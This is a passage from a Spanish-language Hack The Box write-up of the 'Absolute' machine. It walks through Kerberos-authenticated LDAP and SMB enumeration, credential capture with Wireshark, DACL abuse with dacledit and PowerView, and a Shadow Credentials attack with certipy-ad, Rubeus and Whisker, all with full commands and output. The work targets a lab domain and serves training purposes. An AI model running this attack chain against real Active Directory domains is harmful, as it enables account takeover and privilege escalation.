LDAP        10.129.229.59   389    DC               D.Klay                         
LDAP        10.129.229.59   389    DC               s.osvald                       
LDAP        10.129.229.59   389    DC               j.robinson                     
LDAP        10.129.229.59   389    DC               n.smith                        
LDAP        10.129.229.59   389    DC               m.lovegod                      
LDAP        10.129.229.59   389    DC               l.moore                        
LDAP        10.129.229.59   389    DC               c.colt                         
LDAP        10.129.229.59   389    DC               s.johnson                      
LDAP        10.129.229.59   389    DC               d.lemm                         
LDAP        10.129.229.59   389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.129.229.59   389    DC               svc_audit                      
LDAP        10.129.229.59   389    DC               winrm_user                     Used to perform simple network tasks
```
{: .nolineno }

A mí una herramienta que me gusta mucho para un reconocimiento inicial es `ldapdomaindump`, pero no soporta la autenticación por Kerberos así que este caso no aplica. 

También podríamos enumerar los recursos compartidos a los que tenemos permisos de escritura/lectura con `crackmapexec`

```bash
❯ cme smb 10.129.229.59 -u 'd.klay' -p 'Darkmoonsky248girl' -k  --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
SMB         10.129.229.59   445    DC               Share           Permissions     Remark
SMB         10.129.229.59   445    DC               -----           -----------     ------
SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.59   445    DC               C$                              Default share
SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.59   445    DC               Shared                          
SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 
```
{: .nolineno }
Vemos una carpeta llamada `Shared`, que de momento no podemos acceder, pero sería interesante apuntar para mirar más tarde.
#### Bloodhound

Blodhound es una herramienta que se usa para auditar Active Directory. Utiliza gráficos para mostrar cómo están relacionados los objetos dentro del dominio. Esto ayuda a comprender mejor el dominio y a planear posibles vectores de ataque para elevar privilegios o moverse lateralmente dentro del dominio.

Normalmente se suele disponer de una shell en el sistema, y se lanzan los 'injestors' `SharpHound.exe` o `SharpHound.ps1`, para recopilar toda la información a través de consultas LDAP que se guardan en ficheros json. Esto puede ser algo pesado de hacer ya que tienes que tener obligatoriamente una shell en alguno de los equipos del dominio y lo más probable es que tengas que evadir algún antivirus. En este caso en particular no queda otra que tirar `bloodhound-python` para enumerar el dominio. 

Con el siguiente comando realizaremos todas esas consultas sin necesidad de subir ningún binario. La información recopilada estara comprendida en varios ficheros `json` que tendremos que subir a `bloodhound`.

```bash
❯ bloodhound-python -dc dc.absolute.htb -ns 10.129.68.75 -c all -d absolute.htb -u 'd.klay' -p 'Darkmoonsky248girl'
INFO: Found AD domain: absolute.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 10S
```
{: .nolineno }

Para iniciar bloodhound es necesario tener instalado `neo4j`, que es un tipo de base de datos que se basa en grafos.

```
❯ sudo neo4j console
[sudo] password for alex: 
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
```
{: .nolineno }

Una vez iniciada la base de datos `neo4j`, ejecutamos bloodhound. En mi caso lo tengo a la última versión, y lo ejecuto con un alias., ya que por `apt`, suelen faltarle algunas features.

```bash
❯ which bloodhound
bloodhound: aliased to /opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown
```
{: .nolineno }
```
❯ cat ~/.zshrc | grep bloodhound
alias bloodhound='/opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown'
```
{: .nolineno }

Subimos los ficheros json para comenzar el analisis.

![img](/assets/img/post/Absolute/21.png)

Tras realizar varias querys, no encuentro nada de utilidad. Estas querys eran:

* **Find all Kerberoestable Users**
* **Shortest paths to Domain Admins**
* **Shortests paths to Uncronstained Delegation Systems**

Como hemos mencionado antes, en un CTF es común encontrar información sensible, como contraseñas, en las descripciones de los usuarios. En este caso, necesité conectarme a la base de datos Neo4j desde el servidor web y escribir una consulta personalizada para recuperar esta información.

```
MATCH (u:User) return u.name, u.description
```
{: .nolineno }

![img](/assets/img/post/Absolute/1.png)

También lo podemos obtener inspeccionando el json perteneciente a la información de los usuarios.

```bash
❯ cat 20231105223511_users.json  | jq '.data[].Properties | .samaccountname + ":" + .description' -r
:
winrm_user:Used to perform simple network tasks
svc_smb:AbsoluteSMBService123!
d.lemm:
svc_audit:
c.colt:
s.johnson:
l.moore:
n.smith:
m.lovegod:
j.robinson:
D.Klay:
s.osvald:
J.Roberts:
M.Chaffrey:
krbtgt:Key Distribution Center Service Account
Administrator:Built-in account for administering the computer/domain
Guest:Built-in account for guest access to the computer/domain
```
{: .nolineno }

### User Pivoting: smc_smb

Probamos la contraseña del usuario `svc_smb` y vemos que es válida dentro del dominio.

```bash
❯ cme smb 10.129.229.59 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
```
{: .nolineno }
Anteriormente disponíamos de una carpeta compartida por SMB, a la cual no teníamos acceso, vamos a comprobar si ahora con el nuevo usuario comprometido, podemos acceder:

### Enumerando SMB Autenticado

```bash
❯ cme smb 10.129.68.75 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k --shares
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         10.129.68.75    445    DC               [+] Enumerated shares
SMB         10.129.68.75    445    DC               Share           Permissions     Remark
SMB         10.129.68.75    445    DC               -----           -----------     ------
SMB         10.129.68.75    445    DC               ADMIN$                          Remote Admin
SMB         10.129.68.75    445    DC               C$                              Default share
SMB         10.129.68.75    445    DC               IPC$            READ            Remote IPC
SMB         10.129.68.75    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.68.75    445    DC               Shared          READ            
SMB         10.129.68.75    445    DC               SYSVOL          READ            Logon server share 
```
{: .nolineno }

El output de crackmapexec nos indica que disponemos de permisos de lectura para esa carpeta. Para conectarme como el usuario `smb_svc`, voy eliminar el ticket anterior y generar uno nuevo.

```
❯ kdestroy
❯ kinit svc_smb
Password for svc_smb@ABSOLUTE.HTB: 
```

No se porque por `smbclient` me daba fallos por todos lados usando Kerberos. En estes caso use impacket. Es importante setear la variable de entorno `KRB55CNAME` al ticket anteriormente, ya que impacket por defecto busca el fichero `ccache` para usar Kerberos.

```bash
❯ KRB5CCNAME=/tmp/krb5cc_1000 impacket-smbclient 'absolute.htb/svc_smb@dc.absolute.htb' -k
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# 
```
{: .nolineno }

Dentro del fichero vemos dos ficheros, voy a descargarlos para inspeccionarlos detenidamente.
{: .nolineno }
```
# use Shared
# ls
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 19:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 19:02:23 2022 test.exe
```
{: .nolineno }
```
# get test.exe
# get compiler.sh
```

### VPN: Routing

El fichero `compiler.sh` es un script para compilar un programa `nim`y `test.exe` es un ejecutable de Windows de 64 bits.

```bash
❯ file *
compiler.sh: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
test.exe:    PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows, 11 sections
```
{: .nolineno }

Voy a transferir el fichero a mi máquina Windows, para poder trastear más cómodamente.

Como atacante es de esperar que este binario este interactuando con el Domain Controller de alguna manera, pudiendo obtener credenciales en este proceso de comunicación. Lo que esta haciendo realmente es una consulta por LDAP al Domain Controller, y yo quiero capturarla con WireShark, y para esto es necesario tener conectividiad con la máquina víctima desde Windows

**Uso de VPNForwarding.sh**

Después de hacer varias máquinas en las que al final tenía que utilizar Windows y por ende tenía que cambiar la VPN de HTB o ejecutar las mismas reglas iptables una y otra vez, hice un pequeño script que automatizara todo el proceso.

El script es el siguiente  [VPNForwarding.sh](https://raw.githubusercontent.com/ace00k/automation-tools/main/VPNforwarding.sh). Su funcionamiento es sencillo: basta con ejecutarlo con privilegios de root en una máquina Linux y utilizar el comando resultante en la máquina Windows. De esta manera, mi máquina Kali actúa como enrutador, lo que me permite establecer conectividad con la máquina víctima desde mi Windows.

```bash
❯ sudo /opt/automation-tools/./VPNforwarding.sh
[sudo] password for alex: 

[+] Interface tun0 exists, skipping

[!] IPv4 forwarding is not enabled! Do you want to enable it? (y/n): y

[*] Enabling IPv4 forwarding

[+] Done!

[!] Are you sure you want to proceed? All currently saved iptables rules will be deleted. (y/n): 
y
[+] Iptables rules created, please run the following command on your Windows host:

	route add 10.129.0.0/16 192.168.1.44
```
{: .nolineno }

Pegamos el comando en la máquina Windows.

![img](/assets/img/post/Absolute/7.png)

Ahora si que tenemos conectividad con la máquina víctima. Podemos comprobarlo envíando una traza ICMP.

![img](/assets/img/post/Absolute/8.png)

Como nos estamos enfrentando a un controlador de dominio, voy a configurar la IP de Absolute como servidor DNS Esto se puede hacer de la siguiente forma:  (Win + R )  `ncpa.cpl`

![img](/assets/img/post/Absolute/9.png)

Seleccionamos la interfaz Ethernet0 y hacemos click derecho en propiedades.

![img](/assets/img/post/Absolute/11.png)

Nos vamos a `Protocolo de Internet versión 4`

![img](/assets/img/post/Absolute/12.png)

Y ponemos la IP de Absolute como servidor DNS preferido

![img](/assets/img/post/Absolute/13.png)

Si hacemos una petición DNS a `absolute.htb` vemos que nos resuelve correctamente.

![img](/assets/img/post/Absolute/14.png)

### Capturando Credenciales con Wireshark

Habiendo transferido el binario a la máquina Windows, voy a ejecutarlo para ver que hace.

![img](/assets/img/post/Absolute/6.png)

No veo ningún output ni ha ocurrido nada en especial. Antes de hacer reversing, voy a prender WireShark y voy a comprobar si cuando ejecute el binario existe tráfico saliente destinado a la dirección IP de Absolute. Ya que es común que esta clase de binarios customizados tengan que conectarse al DC, para realizar algún tipo de gestión pudiendo capturar credenciales en el proceso.

Cuando utilizamos Wireshark para capturar el tráfico en la interfaz `Ethernet0`, a menudo nos encontramos con una gran cantidad de datos que no son de interés. Con el siguiente filtro vamos a capturar solamente los paquetes que contienen la dirección IP de Absolute y al mismo tiempo, quitamos las solicitudes DNS. El filtro que he utilizado es el siguiente

```
ip.addr == 10.129.68.75 && not udp.port ==53
```

![img](/assets/img/post/Absolute/2.png)

Vamos a volver a ejecutar `test.exe`

![img](/assets/img/post/Absolute/3.png)

En WireShark podemos ver el tráfico de red generado, en el que se encuentran consultas LDAP.

![img](/assets/img/post/Absolute/4.png)

Si inspeccionamos los paquetes podemos ver las credenciales del usuario `m.lovegod`, en texto plano.

![img](/assets/img/post/Absolute/5.png)

## Acceso Inicial

Voy a explicar dos métodos diferentes para obtener acceso. Uno desde Windows y otro desde Linux. En Windows, utilizaremos  `PowerView`, `Rubeus` y `Whisker`, lo que resulta en un proceso más sencillo. En el caso de Linux, tendremos que realizar pasos adicionales, como descargar un script de Impacket llamado `dacledit`, que no se encuentra en la rama por defecto, y luego utilizar la `certipy-ad`.
### Enumerando el vector de ataque desde Bloodhound

Primero vamos a comprobar que las credenciales capturadas por Wireshark sean válidas dentro del dominio.

```bash
❯ cme smb 10.129.68.75 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```
{: .nolineno }

Siendo válidas marcamos al usuario `m.lovegod` como `onwed` dentro de bloodhound, nos movemos a la pestaña de `Node` y hacemos click en `Reachable High Valuable Targets`

![img](/assets/img/post/Absolute/22.png)

![img](/assets/img/post/Absolute/23.png)
El resultado de la query nos muestra un camino para convertirnos en el usuario `winrm_user`, el cual tiene la capacidad de crear una conexión remota en el equipo. 

![img](/assets/img/post/Absolute/24.png)

Si vemos los grupos a los que pertenece `winrm_user`, vemos que es miembro de `Remote Management Users`, que quiere decir, que con las credenciales de este usuario podemos conectarnos mediante el servicio de la administación remota de Windows (WinRM) al DC.

![img](/assets/img/post/Absolute/25.png)

Vamos por partes, primero vamos a hacer click en `Owns`, para ver que podemos hacer

![img](/assets/img/post/Absolute/26.png)

![img](/assets/img/post/Absolute/27.png)

Bloodhound nos dice, que el usuario `m.lovegod` es dueño del grupo `NetWork Audit`, lo cual quiere decir que como propietario, puede cambiar la configuración de seguridad del grupo, incluso si existen unos permisoos establecidos por DACLs. Es decir podemos hacer lo que queramos con este grupo. 

Seguidamente vemos que los miembros de `Network Audit` poseen un `GenericWrite` sobre el usuario `winrm_user`

![img](/assets/img/post/Absolute/28.png)

![img](/assets/img/post/Absolute/29.png)

Podemos escribir atributos específicos del usuario `winrm_user` como miembros de este grupo, pudiendo crear SPNs, es decir hacer el usuario Kerberoesteable y luego con impacket o rubeus obtener el ticket del usuario con su contraseña cifrada, esto tendría sentido si la contraseña de **winrm_user** fuera débil, que no es el caso. En este caso si nos vamos la pestaña `Linux Abuse` , vemos un ataque extra que es el **Shadow Credentials Attack**

![img](/assets/img/post/Absolute/30.png)

Con este ataque es posible añadir Key Credentials al atributo `msDS-KeyCredentialLink` del objeto usuario/ordenador de destino y luego realizar la autenticación Kerberos como esa cuenta utilizando `PKINIT`. 

Los requisitos para para que este ataque funcione son los siguientes:

* El dominio debe tener AD CS configurado
* El dominio debe tener un DC debe soportar PKINIT

El primer requisito lo cumplimos ya que al principio lo hemos enumerado por LDAP

El ataque explicado a detalle se puede encontrar aquí: [Shadow Credentials Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)

### Añadiendo a m.lovegood a Network Audit

Como mencionamos anteriormente, el usuario `mv.lovegod` tiene permisos `FullControl` sobre el grupo `Network Audit`. Por lo tanto, nuestra estrategia implica modificar la DACL para poder agregarlo a dicho grupo.
#### Método 1: Desde Linux

Nos clonamos la rama de `dacledit` en nuestro sistema.

```bash
❯ git clone https://github.com/ShutdownRepo/impacket -b dacledit
Cloning into 'impacket'...
remote: Enumerating objects: 24084, done.
remote: Counting objects: 100% (5485/5485), done.
remote: Compressing objects: 100% (298/298), done.
remote: Total 24084 (delta 5246), reused 5187 (delta 5187), pack-reused 18599
Receiving objects: 100% (24084/24084), 9.82 MiB | 6.68 MiB/s, done.
Resolving deltas: 100% (18353/18353), done.
```
{: .nolineno }

Para no causar confictos con mi versión de impacket, creare un entorno virtual con python

```bash
❯ python3 -m venv .venv
❯ source .venv/bin/activate
```
{: .nolineno }

Instalamos impacket en el entorno

```bash
❯ pip3 install .
Processing /home/alex/HTB/Absolute/content/impacket
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting pyasn1>=0.2.3 (from impacket==0.9.25.dev1+20230823.145202.4518279)
  Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
```
{: .nolineno }

Después de completar estos pasos, ejecutamos el script `dacledity.py`, especificando la variable de entorno `KRB5CCNAME` para que apunte al ticket que generamos previamente. Esto se debe a que, por defecto, Impacket busca un archivo .ccache para la autenticación y en este caso lo hemos generado con kinit.

```bash
❯ KRB5CCNAME=/tmp/krb5cc_1000 ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20231106-192332.bak
[*] DACL modified successfully!
```
{: .nolineno }

Ahora vamos a añadir el usuario al grupo con `net rpc`.

```bash
❯ net rpc group addmem "Network Audit" -U m.lovegod -S dc.absolute.htb -k m.lovegod
```
{: .nolineno }

No vemos ningún output. Podemos comprobar que el usuario se ha añadido correctamente con la opción `members` de `net rpc`

```bash
❯ net rpc group members "Network Audit" -U m.lovegod -S dc.absolute.htb --use-kerberos=required
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit
```
{: .nolineno }
#### Método 2: Desde Windows

El proceso anterior es mucho más sencillo desde una máquina Windows. El primer paso será generar una sesión para el usuario `m.lovegod`, como la autenticación NTLM está desactivada, lo haré mediante Kerberos. Para ello haré uso de `Rubeus.exe`

```
PS C:\users\alex\desktop\HTB> C:\tools\Rubeus.exe asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /domain:absolute.htb /ptt /enctype:aes256

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
[*] Building AS-REQ (w/ preauth) for: 'absolute.htb\m.lovegod'
[*] Using domain controller: 10.129.229.59:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      bHV0ZS5odGI=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  m.lovegod
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  07/11/2023 18:17:04
  EndTime                  :  07/11/2023 22:17:04
  RenewTill                :  07/11/2023 22:17:04
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  A6io03SBq6jyfBE1PzZB8a5V02ZRhPIXsYVYiNvDnqA=
  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554

PS C:\users\alex\desktop\HTB>
```

LIstamos los tickets y vemos que se ha importado correctamente.

```
PS C:\users\alex\desktop\HTB> klist

El id. de inicio de sesión actual es 0:0x25e7d

Vales almacenados en caché: (2)

#0>     Cliente: m.lovegod @ ABSOLUTE.HTB
        Servidor: krbtgt/absolute.htb @ ABSOLUTE.HTB
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0xe10000 -> renewable initial pre_authent name_canonicalize
        Hora de inicio: 11/7/2023 18:17:04 (local)
        Hora de finalización:   11/7/2023 22:17:04 (local)
        Hora de renovación: 11/7/2023 22:17:04 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0x1 -> PRIMARY
        KDC llamado:

#1>     Cliente: m.lovegod @ ABSOLUTE.HTB
        Servidor: cifs/dc.absolute.htb @ ABSOLUTE.HTB
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0xa50000 -> renewable pre_authent ok_as_delegate name_canonicalize
        Hora de inicio: 11/7/2023 18:17:58 (local)
        Hora de finalización:   11/7/2023 22:17:04 (local)
        Hora de renovación: 11/7/2023 22:17:04 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0
        KDC llamado: dc.absolute.htb
```

Podemos comprobarlo listando los recursos compartidos del DC.

```
PS C:\users\alex\desktop\HTB> dir \\dc.absolute.htb\shared


    Directorio: \\dc.absolute.htb\shared


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        08/06/2022     15:22             72 compiler.sh
-a----        08/06/2022     19:29          67584 test.exe

```

Bien para llevar a cabo este ataque según explica bloodhound, es necesario tener importado Powerview

```
PS C:\users\alex\desktop\HTB> Import-Module \tools\PowerView.ps1
```

Una vez echo esto vamos a añadirnos al grupo `Network Audit` con el siguente comando. En este caso el parámetro `-Credential` no es necesario de usar, ya que disponemos un ticket de kerberos perteneciente al usuario `m.lovegod`, por lo que no hace falta crear ningún objeto `PSCredential`.

```
PS C:\users\alex\desktop\HTB> Add-DomainObjectAcl -TargetIdentity "Network Audit" -Rights All -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb
```

Disponiendo de todos los permisos sobre el grupo, voy a añadir el usuario `m.lovegod` al grupo `Network Audit`

```
PS C:\Users\Alex> Add-DomainGroupMember -Identity "Network Audit" -Member m.lovegod -Domain "absolute.htb"
```

![img](/assets/img/post/Absolute/17.png)

Si vemos los miembros del grupo `Network Audit` vemos que `m.lovegod` se ha añadido correctamente.

![img](/assets/img/post/Absolute/31.png)

### Shadow Credentials Attack

#### Desde Linux: Certipy-AD

Este ataque se puede hacer usando `pyWhisker` o `certipy-ad`. En este caso lo voy a hacer con certipy, ya que el proceso es mucho más sencillo.

Con el siguiente comando automatizamos todo el proceso, obtiendo como resultado el hash del usuario `winrm_user` y el TGT, en un fichero ccache.

```bash
❯ KRB5CCNAME=/tmp/krb5cc_1000 certipy-ad shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7bd93d9f-929e-6f28-ccea-c147fe59cf42'
[*] Adding Key Credential with device ID '7bd93d9f-929e-6f28-ccea-c147fe59cf42' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '7bd93d9f-929e-6f28-ccea-c147fe59cf42' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```
{: .nolineno }
Como hemos visto antes, la autenticación NTLM está desactivada, por lo que el hash solo sirve para intentar crackearlo y obtener la contraseña en texto plano, cosa que no he conseguido. En este caso usamos el TGT `.ccache`, para conectarnos por WinRM al DC.

```
❯ ls *.ccache
winrm_user.ccache
```

Usaré `Evil-WinRM`. Para conectarnos usando Kerberos debemos indicar como variable de entorno, el fichero `.ccache` perteneciente al usuario, e indicar el `realm`, es decir el nombre del dominio. También es importante indicar en lugar de la IP, el FQDN del DC, ya que Kerberos es especialillo y no le suelen gustar las IPs.

```bash
❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb -u winrm_user
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user
*Evil-WinRM* PS C:\Users\winrm_user\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::19c
   IPv6 Address. . . . . . . . . . . : dead:beef::7dc9:28ca:b147:9c36
   Link-local IPv6 Address . . . . . : fe80::7dc9:28ca:b147:9c36%11
   IPv4 Address. . . . . . . . . . . : 10.129.68.75
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
                                       10.129.0.1
```
{: .nolineno }

#### Desde Windows: Whisker

Bien, este mismo ataque lo podemos hacer desde Windows con [Whisker](https://github.com/eladshamir/Whisker). Nos clonamos el repositorio y lo compilamos desde **Visual Studio Code**.

![img](/assets/img/post/Absolute/32.png)

Antes de continuar. Existe una tarea programada en la máquina que hace que cada ciertos minutos se borre la DACL, que anteriormente hemos modifcado. Por lo que nuestro usuario será eliminado del grupo `New Audit` y no podremos realizar este ataque con éxito. Así que cada cierto tiempo hay que volver a ejecutar los comandos anteriores para añadir el usuario al grupo mientras realizamos el ataque. Otra cosa importante es que cuando nosotros añadimos el usuario al grupo, el ticket, del que disponemos no guarda esa información o almenos es mi conclusión por que el ataque no funcionaba. Mi consejo es que regenereis el ticket una vez hayais añadido el usuario al grupo. Esto se hace de la siguente manera:

```
klist purge
C:\tools\Rubeus.exe asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /domain:absolute.htb /ptt /enctype:aes128
```

Bien con el ticket bueno en memoria vamos a realizar el ataque

```
PS C:\Users\Alex> C:\tools\Whisker.exe add /domain:absolute.htb /target:winrm_user /user:m.lovegod /dc:dc.absolute.htb
```

![img](/assets/img/post/Absolute/33.png)

El output de **Whisker** nos dice que ejecutemos el siguiente comando con **Rubeus** para obtener el hash NTLM y TGT del usuario `winrm_user`. 

Al comando que indica Whisker, le voy a añadir el parámetro `/ptt`, para inyectar el ticket en memoria. 

```
